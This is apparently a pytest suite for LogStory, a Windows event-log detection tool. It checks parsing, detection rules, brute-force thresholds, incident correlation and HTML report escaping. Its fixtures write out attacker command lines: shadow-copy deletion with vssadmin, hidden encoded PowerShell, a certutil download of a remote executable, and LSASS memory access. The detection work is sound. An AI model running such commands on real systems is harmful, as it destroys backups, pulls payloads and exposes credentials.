"""Tests for LogStory: parsing, rules, correlation and report rendering."""
import json
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

from engine import analyze, detect
from logparser import Event, load_events, normalize_record, parse_event_xml, parse_timestamp
from report import render

HERE = Path(__file__).parent
T = datetime(2026, 1, 1, tzinfo=timezone.utc)


def proc(image, cmd="", parent="", **kw):
    return Event(1, T, "WS-1", {"Image": image, "CommandLine": cmd, "ParentImage": parent, **kw})


def rule_ids(events):
    return {d.rule.id for d in detect(events)}


@pytest.fixture(scope="module")
def sample(tmp_path_factory):
    out = tmp_path_factory.mktemp("s")
    subprocess.run([sys.executable, str(HERE / "make_sample.py")], cwd=out, check=True)
    return out / "sample_attack.jsonl"


# ---------------------------------------------------------------- parsing
def test_timestamp_formats():
    assert parse_timestamp("2026-11-20 09:12:03.123").year == 2026
    assert parse_timestamp("2026-11-20T09:12:03.1234567Z").microsecond == 123456
    assert parse_timestamp("/Date(1764000000000)/").year == 2025
    assert parse_timestamp(1764000000).tzinfo is not None


def test_winlogbeat_record():
    ev = normalize_record({"@timestamp": "2026-11-20T09:00:00Z",
                           "winlog": {"event_id": 1, "computer_name": "PC",
                                      "event_data": {"Image": "C:\\x\\whoami.exe"}}})
    assert ev.event_id == 1 and ev.computer == "PC" and ev.get("ImageName") == "whoami.exe"


def test_evtx_xml_record():
    xml = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>1</EventID><TimeCreated SystemTime="2026-11-20T09:00:00.1234567Z"/>
      <Computer>HOST</Computer></System>
      <EventData><Data Name="Image">C:\\Windows\\System32\\vssadmin.exe</Data>
      <Data Name="CommandLine">vssadmin delete shadows /all</Data></EventData></Event>"""
    ev = parse_event_xml(xml)
    assert ev.computer == "HOST" and rule_ids([ev]) == {"LS-014"}


def test_json_array_and_jsonl(tmp_path):
    recs = [{"EventID": 1, "UtcTime": "2026-01-01 00:00:0%d" % i, "Image": "a.exe"} for i in range(3)]
    (tmp_path / "a.json").write_text(json.dumps(recs))
    (tmp_path / "b.jsonl").write_text("\n".join(json.dumps(r) for r in recs))
    assert len(load_events(tmp_path / "a.json")) == len(load_events(tmp_path / "b.jsonl")) == 3


# ------------------------------------------------------------------ rules
@pytest.mark.parametrize("event,expected", [
    (proc("C:\\W\\powershell.exe", "powershell -nop", "C:\\O\\WINWORD.EXE"), "LS-001"),
    (proc("C:\\W\\powershell.exe", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"), "LS-002"),
    (proc("C:\\W\\certutil.exe", "certutil -urlcache -split -f http://x/a.exe"), "LS-003"),
    (proc("C:\\W\\net.exe", "net localgroup administrators"), "LS-005"),
    (Event(10, T, "WS-1", {"TargetImage": "C:\\W\\lsass.exe", "GrantedAccess": "0x1010"}), "LS-008"),
    (Event(13, T, "WS-1", {"TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x"}), "LS-009"),
    (Event(1102, T, "WS-1", {"SubjectUserName": "bob"}), "LS-012"),
    (Event(3, T, "WS-1", {"Image": "C:\\W\\mshta.exe", "DestinationIp": "1.2.3.4"}), "LS-015"),
])
def test_rule_hits(event, expected):
    assert expected in rule_ids([event])


@pytest.mark.parametrize("event", [
    proc("C:\\W\\powershell.exe", "powershell Get-Process", "C:\\W\\explorer.exe"),
    proc("C:\\W\\net.exe", "net use Z: \\\\fs\\share"),
    Event(10, T, "WS-1", {"TargetImage": "C:\\W\\lsass.exe", "GrantedAccess": "0x1000"}),
    Event(3, T, "WS-1", {"Image": "C:\\Chrome\\chrome.exe"}),
])
def test_benign_events_are_quiet(event):
    assert rule_ids([event]) == set()


def test_brute_force_threshold():
    fails = [Event(4625, T.replace(second=i * 5), "DC", {"IpAddress": "198.51.100.9"}) for i in range(5)]
    assert rule_ids(fails) == {"LS-100"}
    assert rule_ids(fails[:4]) == set()


def test_story_is_human_readable():
    d = detect([proc("C:\\W\\powershell.exe", "", "C:\\O\\WINWORD.EXE", User="ORVANE\\r.cohen")])[0]
    assert "WINWORD.EXE opened by ORVANE\\r.cohen spawned powershell.exe" in d.story


# ------------------------------------------------------------- end to end
def test_sample_reconstructs_full_attack(sample):
    a = analyze(load_events(sample))
    assert [i.computer for i in a.incidents] == ["ORV-DC01.orvane.local", "ORV-LT-0117.orvane.local"]
    ws = a.incidents[1]
    assert ws.severity == "critical"
    assert ws.tactics[0] == "Initial Access" and "Impact" in ws.tactics
    assert len(ws.roots) == 1 and ws.roots[0].name == "explorer.exe"
    assert {"LS-001", "LS-008", "LS-014", "LS-100"} <= {d.rule.id for d in a.detections}
    # benign noise in the sample must not trigger anything
    assert not any("chrome" in d.event.get("Image").lower() for d in a.detections)


def test_report_renders_and_escapes(sample):
    a = analyze(load_events(sample))
    page = render(a, "<script>x</script>")
    assert page.startswith("<!DOCTYPE html>") and "Incident 2" in page
    assert "<script>x</script>" not in page and "T1003.001" in page
    assert "chrome.exe" not in page  # tree is pruned to the attack path


def test_cli_exit_codes(sample, tmp_path):
    cli = [sys.executable, str(HERE / "logstory.py")]
    r = subprocess.run(cli + [str(sample), "-o", str(tmp_path / "r.html"), "--json", str(tmp_path / "f.json")],
                       capture_output=True, text=True)
    assert r.returncode == 1 and json.loads((tmp_path / "f.json").read_text())["summary"]["incidents"] == 2
    clean = tmp_path / "clean.jsonl"
    clean.write_text(json.dumps({"EventID": 1, "UtcTime": "2026-01-01 00:00:00", "Image": "C:\\notepad.exe"}))
    assert subprocess.run(cli + [str(clean), "-o", str(tmp_path / "c.html")], capture_output=True).returncode == 0
